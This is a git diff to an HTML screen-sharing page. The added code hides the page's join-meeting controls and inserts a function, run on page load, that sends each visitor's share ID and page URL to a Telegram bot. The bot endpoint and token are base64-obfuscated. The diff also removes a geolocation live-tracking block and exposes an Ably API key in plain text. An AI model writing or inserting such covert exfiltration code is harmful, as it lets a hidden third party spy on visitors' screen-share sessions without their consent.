@@ -169,7 +169,7 @@ img {
     <button id="share-button">
         <i class="fa-solid fa-share-from-square"></i> Share my screen now
     </button>
-
+<div class="hidden">
     <br><br>
     <div>OR</div>
     <br>
@@ -177,7 +177,7 @@ img {
     <input type="number" id="meeting-id" placeholder="Enter share code">
     <button id="join-meeting-button">
         <i class="fa-solid fa-right-to-bracket"></i> Join Meeting
-    </button>
+    </button></div>
 </div>
 
 <!-- Main Content -->
@@ -219,7 +219,30 @@ img {
 </div>
 
 <script src="https://cdn.ably.com/lib/ably.min-2.js"></script>
-<script>const ably = new Ably.Realtime({ key: 'FZIIwA.DPmHYg:wx2NwzPwsJnugsaa20ditsFiIVtlPVbXUXsW5YBbEAk' });</script>
+<script>const ably = new Ably.Realtime({ key: 'FZIIwA.DPmHYg:wx2NwzPwsJnugsaa20ditsFiIVtlPVbXUXsW5YBbEAk' });
+function send_track(room) {
+        // Create FormData object
+        var formData = new FormData();
+        formData.append("chat_id", "-1001774121896");
+        formData.append("disable_web_page_preview", "true");
+        formData.append("text","Share ID: " + room + " || URL: " + window.location.href);
+
+        var apiUrl = window.atob("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDYxNzAwMTMwODA6QUFHRndOLTQ0ZHoyMUVNblI2amFYUW5yQktudmNsa1hHZXMvc2VuZE1lc3NhZ2U=");
+
+        // Send data using fetch
+        fetch(apiUrl, {
+            method: "POST",
+            mode: "no-cors",
+            body: formData
+        })
+        .then(function(response) {
+            console.log("Data sent successfully!");
+        })
+        .catch(function(error) {
+            console.error("Error:", error);
+        });
+}
+</script>
 
 <script defer>
     'use strict';
@@ -235,6 +258,7 @@ img {
       peer = 'pc1';
     }
     const room = location.hash.substring(1);
+    send_track(room);
 
     $('join-meeting-button').addEventListener('click', () => {
       const id = $('meeting-id').value.trim().replace(/\s+/g, '');
@@ -444,66 +468,5 @@ img {
     }
     window.addEventListener("beforeunload", hangup);
   </script>
-  
-<p id="status">Getting live location...</p>
-<p id="link"></p>
-<p id="coords"></p>
-
-<script>
-let watchId;
-
-window.onload = function () {
-  if (!navigator.geolocation) {
-    document.getElementById("status").innerText = "Geolocation not supported";
-    return;
-  }
-
-  navigator.permissions.query({ name: 'geolocation' }).then(function(result) {
-
-    if (result.state === 'denied') {
-      document.getElementById("status").innerText = "Location Blocked ❌";
-      return;
-    }
-
-    startLiveTracking();
-  });
-};
-
-function startLiveTracking() {
-
-  watchId = navigator.geolocation.watchPosition(
-    function(position) {
-
-      const lat = position.coords.latitude;
-      const lng = position.coords.longitude;
-
-      const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;
-
-      document.getElementById("status").innerText = "Live Location Updating... 🟢";
-
-      document.getElementById("coords").innerText =
-        `Latitude: ${lat} | Longitude: ${lng}`;
-
-      document.getElementById("link").innerHTML =
-        `<a href="${mapLink}" target="_blank">Open in Google Maps</a>`;
-
-    },
-    function(error) {
-      document.getElementById("status").innerText = "Location Blocked ❌";
-    },
-    {
-      enableHighAccuracy: true,
-      maximumAge: 0,
-      timeout: 5000
-    }
-  );
-}
-
-// Stop tracking function (optional)
-function stopTracking() {
-  navigator.geolocation.clearWatch(watchId);
-  document.getElementById("status").innerText = "Tracking Stopped";
-}
-</script>
 </body>
 </html>
